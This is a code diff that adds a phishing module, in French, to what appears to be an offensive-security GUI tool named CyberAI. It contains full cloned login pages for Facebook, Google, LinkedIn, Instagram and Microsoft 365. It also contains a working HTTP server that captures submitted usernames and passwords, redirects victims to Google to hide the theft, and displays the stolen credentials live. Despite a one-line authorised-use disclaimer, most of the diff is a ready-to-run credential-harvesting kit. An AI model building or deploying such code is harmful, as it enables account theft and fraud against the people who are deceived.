@@ -259,6 +259,7 @@ class CyberAI(tk.Tk):
             " DoS ":       DoSTab,
             " Anonymity " : AnonymityTab,
             " Exploit "   : ExploitTab,
+            " Phishing "  : PhishingTab,
         }
 
         for name, cls in tab_classes.items():
@@ -2192,6 +2193,342 @@ class ExploitTab(BaseTab):
         self.log(self.output, "  - Scan CVE par service/banni\u00e8re")
         self.log(self.output, "  - Auto-exploitation SMB/SSH/FTP")
         self.log(self.output, "  - Matching avec base de donn\u00e9es Exploit-DB")
+
+
+# ════════════════════════ 9. PHISHING ════════════════════════
+PHISHING_TEMPLATES = {
+    "Facebook": {
+        "title": "Facebook - Connexion",
+        "logo": "📘",
+        "fields": ["email", "pass"],
+        "html": """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Facebook - Connexion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
+body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px;text-align:center}
+.logo{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px}
+input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none}
+input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+button{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;width:100%;cursor:pointer}
+button:hover{background:#166fe5}
+.line{border-top:1px solid #dadde1;margin:20px 0}
+a{color:#1877f2;text-decoration:none;font-size:14px;display:block;margin-top:12px}
+a:hover{text-decoration:underline}
+</style></head><body>
+<div class="card">
+<div class="logo">facebook</div>
+<form method="POST" action="/">
+<input type="text" name="email" placeholder="Adresse email ou num\u00e9ro de t\u00e9l." required>
+<input type="password" name="pass" placeholder="Mot de passe" required>
+<button type="submit">Se connecter</button>
+</form>
+<div class="line"></div>
+<a href="#">Mot de passe oubli\u00e9 ?</a>
+</div></body></html>"""
+    },
+    "Google": {
+        "title": "Google - Connexion",
+        "logo": "🔑",
+        "fields": ["email", "pass"],
+        "html": """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google - Connexion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
+body{background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:450px;text-align:center}
+.logo{font-size:32px;font-weight:400;margin-bottom:30px}
+.logo span{color:#4285f4}span:nth-child(2){color:#ea4335}span:nth-child(3){color:#fbbc04}span:nth-child(4){color:#34a853}
+h2{font-size:24px;font-weight:400;margin-bottom:8px}
+p{color:#5f6368;font-size:14px;margin-bottom:30px}
+input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
+input:focus{border-color:#4285f4}
+button{background:#4285f4;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;width:100%;cursor:pointer}
+button:hover{background:#1a73e8}
+.footer{margin-top:40px;font-size:12px;color:#5f6368}
+</style></head><body>
+<div class="card">
+<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+<h2>Connexion</h2>
+<p>Utilisez votre compte Google</p>
+<form method="POST" action="/">
+<input type="text" name="email" placeholder="Adresse email" required>
+<input type="password" name="pass" placeholder="Mot de passe" required>
+<button type="submit">Suivant</button>
+</form>
+<div class="footer"><a href="#">Aide</a> &middot; <a href="#">Confidentialit\u00e9</a> &middot; <a href="#">Conditions</a></div>
+</div></body></html>"""
+    },
+    "LinkedIn": {
+        "title": "LinkedIn - Connexion",
+        "logo": "🔗",
+        "fields": ["email", "pass"],
+        "html": """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LinkedIn - Connexion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto}
+body{background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;border-radius:8px;padding:24px;width:400px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.08)}
+.logo{color:#0a66c2;font-size:40px;font-weight:bold;margin-bottom:20px}
+input{width:100%;padding:14px 12px;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:16px;margin-bottom:12px;outline:none}
+input:focus{border-color:#0a66c2}
+button{background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:12px 24px;font-size:16px;font-weight:600;width:100%;cursor:pointer}
+button:hover{background:#004182}
+.line{margin:16px 0;font-size:12px;color:rgba(0,0,0,.6)}
+</style></head><body>
+<div class="card">
+<div class="logo">LinkedIn</div>
+<form method="POST" action="/">
+<input type="text" name="email" placeholder="Email ou t\u00e9l\u00e9phone" required>
+<input type="password" name="pass" placeholder="Mot de passe" required>
+<button type="submit">S\u2019identifier</button>
+</form>
+<div class="line">---</div>
+</div></body></html>"""
+    },
+    "Instagram": {
+        "title": "Instagram - Connexion",
+        "logo": "📸",
+        "fields": ["username", "password"],
+        "html": """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram - Connexion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto}
+body{background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center}
+.logo{font-family:'Billabong',cursive;font-size:50px;margin-bottom:30px}
+input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;outline:none}
+button{background:#0095f6;color:#fff;border:none;border-radius:8px;padding:8px 16px;font-size:14px;font-weight:600;width:100%;cursor:pointer;margin-top:8px}
+button:hover{background:#1877f2}
+.line{margin:20px 0;font-size:12px;color:#8e8e8e}
+</style></head><body>
+<div class="card">
+<div class="logo">Instagram</div>
+<form method="POST" action="/">
+<input type="text" name="username" placeholder="Nom d'utilisateur" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">Se connecter</button>
+</form>
+<div class="line">---</div>
+</div></body></html>"""
+    },
+    "Microsoft 365": {
+        "title": "Microsoft - Connexion",
+        "logo": "🪟",
+        "fields": ["login", "passwd"],
+        "html": """
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Microsoft 365 - Connexion</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;width:440px}
+.logo{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:20px}
+h2{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
+input{width:100%;padding:6px 10px;border:1px solid #666;border-radius:2px;font-size:15px;margin-bottom:16px;outline:none;height:36px}
+input:focus{border-color:#0067b8}
+button{background:#0067b8;color:#fff;border:none;padding:6px 20px;font-size:15px;cursor:pointer;float:right;min-width:108px;height:36px}
+button:hover{background:#005da6}
+.footer{clear:both;padding-top:40px;font-size:12px;color:#666}
+</style></head><body>
+<div class="card">
+<div class="logo">Microsoft</div>
+<h2>Se connecter</h2>
+<form method="POST" action="/">
+<input type="text" name="login" placeholder="Email, t\u00e9l\u00e9phone ou Skype" required>
+<input type="password" name="passwd" placeholder="Mot de passe" required>
+<button type="submit">Se connecter</button>
+</form>
+<div class="footer"><a href="#">Informations de connexion</a></div>
+</div></body></html>"""
+    },
+}
+
+
+class PhishingServer:
+    def __init__(self, tab, port=8080):
+        self.tab = tab
+        self.port = port
+        self.server = None
+        self.thread = None
+
+    def start(self, html, port):
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+
+        class PhishHandler(BaseHTTPRequestHandler):
+            def log_message(self, fmt, *args):
+                pass
+
+            def do_GET(self):
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(html.encode())
+
+            def do_POST(self):
+                length = int(self.headers.get("Content-Length", 0))
+                body = self.rfile.read(length).decode()
+                self.server.captured.append(body)
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b"<script>window.location.href='https://www.google.com';</script>")
+
+        class PhishHTTPServer(HTTPServer):
+            def __init__(self, *a, **kw):
+                self.captured = []
+                super().__init__(*a, **kw)
+            def process_request(self, request, client_address):
+                self.captured_data = self.captured
+                super().process_request(request, client_address)
+
+        self.server = PhishHTTPServer(("0.0.0.0", port), PhishHandler)
+        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+        self.thread.start()
+        return True
+
+    def stop(self):
+        if self.server:
+            self.server.shutdown()
+
+    def get_captured(self):
+        if self.server:
+            return list(self.server.captured)
+        return []
+
+
+class PhishingTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.server = None
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        warn = ttk.LabelFrame(main, text="\u26a0 Avertissement")
+        warn.pack(fill=tk.X, pady=(0, 6))
+        ttk.Label(warn, text=(
+            "Usage strictement r\u00e9serv\u00e9 aux tests d'intrusion autoris\u00e9s et campagnes "
+            "de sensibilisation. L'utilisation non autoris\u00e9e est ill\u00e9gale."
+        ), foreground="red", wraplength=780).pack(padx=10, pady=4)
+
+        # ── Configuration ──
+        cfg = ttk.LabelFrame(main, text="Configuration")
+        cfg.pack(fill=tk.X, pady=(0, 6))
+
+        ttk.Label(cfg, text="Template:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.template_var = tk.StringVar(value="Facebook")
+        ttk.Combobox(cfg, textvariable=self.template_var,
+                     values=list(PHISHING_TEMPLATES.keys()), width=20, state="readonly"
+                     ).grid(row=0, column=1, padx=5, pady=4, sticky="w")
+
+        ttk.Label(cfg, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.entry_port = ttk.Spinbox(cfg, from_=1024, to=65535, width=6, value=8080)
+        self.entry_port.grid(row=0, column=3, padx=5, pady=4, sticky="w")
+
+        ttk.Label(cfg, text="URL locale:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
+        self.lbl_url = ttk.Label(cfg, text="http://localhost:8080", font=("TkDefaultFont", 10, "bold"), foreground="blue")
+        self.lbl_url.grid(row=0, column=5, padx=5, pady=4, sticky="w")
+
+        # ── Control ──
+        ctrl = ttk.Frame(cfg)
+        ctrl.grid(row=1, column=0, columnspan=6, pady=6)
+        self.btn_start = ttk.Button(ctrl, text="D\u00e9marrer le serveur", command=self.run_start, width=22)
+        self.btn_start.pack(side=tk.LEFT, padx=5)
+        self.btn_stop = ttk.Button(ctrl, text="Arr\u00eater", command=self.stop_server, width=15, state=tk.DISABLED)
+        self.btn_stop.pack(side=tk.LEFT, padx=5)
+        self.lbl_status = ttk.Label(ctrl, text="\u25cf Arr\u00eat\u00e9", foreground="red", font=("TkDefaultFont", 10, "bold"))
+        self.lbl_status.pack(side=tk.LEFT, padx=10)
+
+        # ── Captured Log ──
+        log_frame = ttk.LabelFrame(main, text="Identifiants captur\u00e9s (en temps r\u00e9el)")
+        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 6))
+        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, font=("Consolas", 9), state="normal")
+        self.log_text.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
+        self.log_text.tag_config("cred", foreground="green", font=("Consolas", 9, "bold"))
+
+        # ── Preview ──
+        self.output = self.make_output(main)
+
+    def run_start(self):
+        port = int(self.entry_port.get())
+        template = self.template_var.get()
+        data = PHISHING_TEMPLATES.get(template)
+        if not data:
+            messagebox.showerror("Erreur", "Template inconnu.")
+            return
+        self.clear(self.log_text)
+        self.log_text.insert(tk.END, f"[*] Serveur phishing d\u00e9marr\u00e9 sur le port {port}\n")
+        self.log_text.insert(tk.END, f"[*] Template: {template}\n")
+        self.log_text.insert(tk.END, f"[*] URL: http://0.0.0.0:{port}\n")
+        self.log_text.insert(tk.END, f"[*] URL locale: http://localhost:{port}\n")
+        self.log_text.insert(tk.END, "-" * 50 + "\n")
+
+        self.server = PhishingServer(self, port)
+        html = data["html"]
+        self.server.start(html, port)
+        self.lbl_url.config(text=f"http://localhost:{port}")
+        self.btn_start.config(state=tk.DISABLED)
+        self.btn_stop.config(state=tk.NORMAL)
+        self.lbl_status.config(text="\u25cf En \u00e9coute", foreground="green")
+
+        local_ip = self._get_local_ip()
+        self.log(self.output, f"Serveur phishing d\u00e9marr\u00e9 sur 0.0.0.0:{port}", "bold")
+        self.log(self.output, f"URL locale: http://localhost:{port}", "success")
+        self.log(self.output, f"URL r\u00e9seau: http://{local_ip}:{port}", "success")
+        self.log(self.output, f"Template: {template}")
+        self.log(self.output, "En attente des identifiants...\n", "bold")
+
+        self.run_thread(lambda: self._poll_captured())
+
+    def _poll_captured(self):
+        seen = set()
+        while self.server and self.server.server:
+            time.sleep(1)
+            for item in self.server.get_captured():
+                if item not in seen:
+                    seen.add(item)
+                    parts = item.split("&")
+                    self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
+                    for p in parts:
+                        if "=" in p:
+                            k, v = p.split("=", 1)
+                            from urllib.parse import unquote
+                            v = unquote(v)
+                            self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
+                    self.log_text.insert(tk.END, "-" * 50 + "\n")
+                    self.log_text.see(tk.END)
+                    self.log(self.output, f"Identifiants captur\u00e9s !", "success")
+
+    def _get_local_ip(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+
+    def stop_server(self):
+        if self.server:
+            self.server.stop()
+            self.server = None
+        self.btn_start.config(state=tk.NORMAL)
+        self.btn_stop.config(state=tk.DISABLED)
+        self.lbl_status.config(text="\u25cf Arr\u00eat\u00e9", foreground="red")
+        self.log(self.output, "Serveur arr\u00eat\u00e9.", "warning")
 
 
 # ════════════════════════ MAIN ════════════════════════
